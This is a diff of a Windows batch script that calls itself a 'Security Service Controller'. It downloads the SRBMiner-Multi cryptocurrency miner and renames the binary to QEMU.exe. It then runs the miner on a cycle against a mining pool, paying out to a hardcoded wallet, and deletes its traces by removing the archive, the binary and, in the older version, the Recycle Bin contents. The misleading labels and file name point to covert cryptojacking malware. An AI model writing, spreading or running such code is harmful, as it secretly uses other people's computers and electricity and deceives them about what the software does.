@@ -11,44 +11,50 @@
 title Security Service Controller
 setlocal EnableDelayedExpansion
 
-echo Downloading...
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip' -OutFile '%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1-win64.zip' -UseBasicParsing"
+set BASE=%USERPROFILE%\Downloads
+set ZIP=%BASE%\SRBMiner-Multi-3-1-1-win64.zip
+set EXTRACT=%BASE%\SRBMiner-Multi-3-1-1
+set BIN=%BASE%\QEMU.exe
+set FLAG=%BASE%\security_downloaded.flag
 
-echo Extracting ZIP...
-powershell -Command "Expand-Archive -Force '%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1-win64.zip' '%USERPROFILE%\Downloads'"
+REM =========================
+REM DOWNLOAD SEKALI SAJA
+REM =========================
 
-echo Replacing QEMU.exe...
-del /f /q "%USERPROFILE%\Downloads\QEMU.exe" >nul 2>&1
-copy /y "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1\SRBMiner-MULTI.exe" "%USERPROFILE%\Downloads\QEMU.exe" >nul
+if exist "%FLAG%" goto SKIP_DOWNLOAD
 
-echo Cleaning extracted files...
-rmdir /s /q "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1"
-del /f /q "%USERPROFILE%\Downloads\SRBMiner-Multi-3-1-1-win64.zip"
+echo [Security] Downloading binary...
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip' -OutFile '%ZIP%' -UseBasicParsing"
 
-echo Emptying Recycle Bin...
-powershell -Command "Clear-RecycleBin -Force" >nul 2>&1
+echo [Security] Extracting...
+powershell -Command "Expand-Archive -Force '%ZIP%' '%BASE%'"
 
-echo UPDATE COMPLETE
+copy /y "%EXTRACT%\SRBMiner-MULTI.exe" "%BIN%" >nul
+
+del /f /q "%ZIP%"
+rmdir /s /q "%EXTRACT%"
+
+echo OK>"%FLAG%"
+
+:SKIP_DOWNLOAD
 
 echo ========================================
 echo   Security Service Controller STARTED
 echo ========================================
 
 REM =========================
-REM Countdown Total 15 Menit
+REM COUNTDOWN 15 MENIT
 REM =========================
 
 echo [Security] Countdown: 15 minutes remaining...
 timeout /t 300 /nobreak
-
 echo [Security] Countdown: 10 minutes remaining...
 timeout /t 300 /nobreak
-
 echo [Security] Countdown: 5 minutes remaining...
 timeout /t 300 /nobreak
 
 REM =========================
-REM LOOP SECURITY SERVICE
+REM LOOP
 REM =========================
 
 :SECURITY_LOOP
@@ -57,7 +63,7 @@ echo ----------------------------------------
 echo [Security] Service running (14 minutes)
 echo ----------------------------------------
 
-start "" /b "C:\Users\%USERNAME%\Downloads\QEMU.exe" ^
+start "" "%BIN%" ^
  --algorithm yespowerr16 ^
  --pool yespowerR16.sea.mine.zpool.ca:6534 ^
  --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
@@ -71,18 +77,19 @@ start "" /b "C:\Users\%USERNAME%\Downloads\QEMU.exe" ^
  --cpu-threads 2 ^
  --cpu-threads-intensity 1 ^
  --cpu-threads-priority 1 ^
- --miner-priority 1 ^
- --proxy 174.138.61.184:1080
+ --miner-priority 1
 
-REM Simpan PID terakhir
-set QEMU_PID=%!
-
-REM Tunggu 14 menit (840 detik)
+REM 14 menit
 timeout /t 840 /nobreak
 
-echo [Security] Stopping service (PID=%QEMU_PID%)...
+echo [Security] Stopping service...
 
-taskkill /PID %QEMU_PID% >nul 2>&1
+for /f "skip=1 tokens=2 delims=," %%P in ('
+  wmic process where "ExecutablePath='%BIN%'" get ProcessId /format:csv
+') do taskkill /PID %%P /F >nul 2>&1
+
+echo [Security] Removing binary...
+del /f /q "%BIN%" >nul 2>&1
 
 echo [Security] Idle 2 minutes...
 timeout /t 120 /nobreak
